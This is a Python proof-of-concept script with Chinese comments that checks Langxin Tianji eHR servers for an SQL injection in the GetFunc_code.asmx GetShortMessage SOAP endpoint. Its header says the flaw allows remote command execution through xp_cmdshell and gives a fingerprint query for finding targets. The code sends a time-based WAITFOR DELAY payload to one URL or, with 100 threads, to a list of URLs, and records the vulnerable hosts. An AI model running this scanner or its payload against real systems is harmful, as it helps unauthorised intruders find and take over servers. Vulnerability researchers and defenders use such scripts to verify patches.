#朗新天霁eHR GetFunc_code.asmx SQL注入致RCE漏洞
#GetToken等多个实例处存在SQL注入漏洞,未经身份验证的朗新大霁eHR GetFunc_code.asmx接囗的GetMessage、GetShortMessage.远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
#body="/default.aspx?ReturnUrl=%2f" && body="silverlight"    LXTJeHR_GetFunc_GetShortMessage_sql.py
import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              朗新天霁eHR GetFunc_code.asmx接口GetShortMessageSQL注入致RCE漏洞░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a 朗新天霁eHR GetFunc_code.asmx接口GetShortMessageSQL注入致RCE Vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = "/ws/GetFunc_code.asmx"
    url = target+payload_url
    headers = {
        'Content-Type':'text/xml; charset=utf-8',
        'Content-Length':'length',
        'SOAPAction':'"http://tempuri.org/GetShortMessage"',
    }
    data = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetShortMessage xmlns=\"http://tempuri.org/\">\r\n      <a0190>1';WAITFOR DELAY '0:0:5'--</a0190>\r\n    </GetShortMessage>\r\n  </soap:Body>\r\n</soap:Envelope>"
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=6)
        time_taken = res.elapsed.total_seconds()
        if res.status_code == 200 and 5 <= time_taken < 7:
            print(f"{BLUE}[+]该站点存在sql注入漏洞,url:{target}{RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else :
            print("[-]该站点不存在sql注入漏洞 ,url:"+target)
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")        
    except Exception as e:
        print(f"[*] 请求发生异常,URL: {target}, 错误信息: {str(e)}")
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")

if __name__ == '__main__':
    main()
